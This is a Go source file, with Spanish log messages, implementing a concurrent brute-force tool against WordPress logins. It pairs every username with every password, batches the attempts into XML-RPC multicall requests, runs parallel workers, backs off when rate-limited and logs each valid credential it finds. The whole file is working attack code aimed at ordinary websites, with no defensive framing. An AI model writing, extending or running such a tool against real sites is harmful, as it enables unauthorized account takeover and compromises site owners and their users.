package main

import (
	"context"
	"fmt"
	"math"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

type Credential struct {
	Username string
	Password string
}

type FoundCredential struct {
	Username string
	Password string
}

type batchWork struct {
	Index int
	Creds []Credential
}

type BruteForcer struct {
	cfg     *ResolvedConfig
	client  *WPClient
	found   []FoundCredential
	mu      sync.Mutex
	started time.Time
}

func NewBruteForcer(cfg *ResolvedConfig, client *WPClient) *BruteForcer {
	return &BruteForcer{
		cfg:    cfg,
		client: client,
		found:  make([]FoundCredential, 0),
	}
}

func (bf *BruteForcer) Run(ctx context.Context) ([]FoundCredential, error) {
	bf.started = time.Now()

	creds := bf.generateCredentials()
	total := len(creds)
	if total == 0 {
		return nil, fmt.Errorf("no hay pares de credenciales para probar")
	}

	logInfo("Iniciando bruteforce: %d usuarios x %d contraseñas = %d intentos",
		len(bf.cfg.UsernameList), len(bf.cfg.PasswordList), total)

	batches := bf.buildBatches(creds)
	totalBatches := len(batches)
	logDebug("Dividido en %d lotes de %d (workers: %d, cooldown: %dms)",
		totalBatches, bf.cfg.BatchSize, bf.cfg.Workers, bf.cfg.CooldownMs)

	batchChan := make(chan batchWork, totalBatches)
	var attempted int64
	progressTicker := time.NewTicker(1 * time.Second)
	defer progressTicker.Stop()
	workersDone := make(chan struct{})

	go func() {
		for {
			select {
			case <-progressTicker.C:
				attemptedVal := atomic.LoadInt64(&attempted)
				elapsed := time.Since(bf.started).Seconds()
				rate := float64(0)
				if elapsed > 0 {
					rate = float64(attemptedVal) / elapsed
				}
				logProgress(int(attemptedVal), total, rate, elapsed, len(bf.getFound()))
			case <-workersDone:
				return
			}
		}
	}()

	var wg sync.WaitGroup
	for i := 0; i < bf.cfg.Workers; i++ {
		wg.Add(1)
		go bf.worker(ctx, i, batchChan, creds, &wg, &attempted)
	}

	go func() {
		for _, batch := range batches {
			batchChan <- batch
		}
		close(batchChan)
	}()

	wg.Wait()
	close(workersDone)

	elapsed := time.Since(bf.started)
	attemptedVal := atomic.LoadInt64(&attempted)
	rate := float64(0)
	if elapsed.Seconds() > 0 {
		rate = float64(attemptedVal) / elapsed.Seconds()
	}
	logProgress(int(attemptedVal), total, rate, elapsed.Seconds(), len(bf.getFound()))
	logInfo("Bruteforce completado en %s", elapsed.Round(time.Millisecond))

	return bf.getFound(), nil
}

func (bf *BruteForcer) worker(ctx context.Context, id int,
	batchChan <-chan batchWork, allCreds []Credential,
	wg *sync.WaitGroup, attempted *int64) {

	defer wg.Done()

	cooldown := time.Duration(bf.cfg.CooldownMs) * time.Millisecond

	for batch := range batchChan {
		select {
		case <-ctx.Done():
			return
		default:
		}

		var resp *MulticallResponse
		var err error

		for attempt := 0; attempt < 6; attempt++ {
			if attempt > 0 {
				time.Sleep(cooldown)
			}

			resp, err = bf.client.SendMulticall(batch.Creds)
			if err != nil {
				logError("Worker %d: error en la solicitud: %v", id, err)
				break
			}

			if resp.RateLimited {
				sleepMs := math.Pow(2, float64(attempt)) * float64(bf.cfg.CooldownMs)
				backoff := time.Duration(sleepMs) * time.Millisecond
				logWarn("Worker %d: ratelimited, esperando %v (intento %d/6)", id, backoff, attempt+1)
				time.Sleep(backoff)
				continue
			}

			if resp.StatusCode != http.StatusOK {
				logWarn("Worker %d: HTTP inesperado %d", id, resp.StatusCode)
				if attempt < 5 {
					continue
				}
				break
			}

			atomic.AddInt64(attempted, int64(len(batch.Creds)))

			if resp.Results == nil {
				continue
			}

			allFailed := len(resp.Results) == len(batch.Creds)
			for _, r := range resp.Results {
				if r.Success {
					allFailed = false
					break
				}
			}

			if !allFailed {
				for i, r := range resp.Results {
					if r.Success {
						gIdx := batch.Index + i
						if gIdx < len(allCreds) {
							cred := allCreds[gIdx]
							valid, verr := bf.client.VerifyCredential(cred.Username, cred.Password)
							if verr == nil && valid {
								bf.addFound(FoundCredential{Username: cred.Username, Password: cred.Password})
								logSuccess("CREDENCIAL VALIDA: %s:%s", cred.Username, cred.Password)
							}
						}
					}
				}
			} else {
				logWarn("Worker %d: lote en offset %d todos los faultcodes — verificando uno por uno...", id, batch.Index)
				for _, cred := range batch.Creds {
					select {
					case <-ctx.Done():
						return
					default:
					}
					time.Sleep(cooldown / 2)
					valid, verr := bf.client.VerifyCredential(cred.Username, cred.Password)
					if verr == nil && valid {
						bf.addFound(FoundCredential{Username: cred.Username, Password: cred.Password})
						logSuccess("CREDENCIAL VALIDA: %s:%s", cred.Username, cred.Password)
					}
				}
			}
			break
		}
	}
}

func (bf *BruteForcer) generateCredentials() []Credential {
	total := len(bf.cfg.UsernameList) * len(bf.cfg.PasswordList)
	creds := make([]Credential, 0, total)

	for _, user := range bf.cfg.UsernameList {
		for _, pass := range bf.cfg.PasswordList {
			creds = append(creds, Credential{Username: user, Password: pass})
		}
	}

	return creds
}

func (bf *BruteForcer) buildBatches(creds []Credential) []batchWork {
	var batches []batchWork
	batchSize := bf.cfg.BatchSize

	for i := 0; i < len(creds); i += batchSize {
		end := i + batchSize
		if end > len(creds) {
			end = len(creds)
		}
		batches = append(batches, batchWork{
			Index: i,
			Creds: creds[i:end],
		})
	}

	return batches
}

func (bf *BruteForcer) getFound() []FoundCredential {
	bf.mu.Lock()
	defer bf.mu.Unlock()

	cp := make([]FoundCredential, len(bf.found))
	copy(cp, bf.found)
	return cp
}

func (bf *BruteForcer) addFound(cred FoundCredential) {
	bf.mu.Lock()
	defer bf.mu.Unlock()
	bf.found = append(bf.found, cred)
}
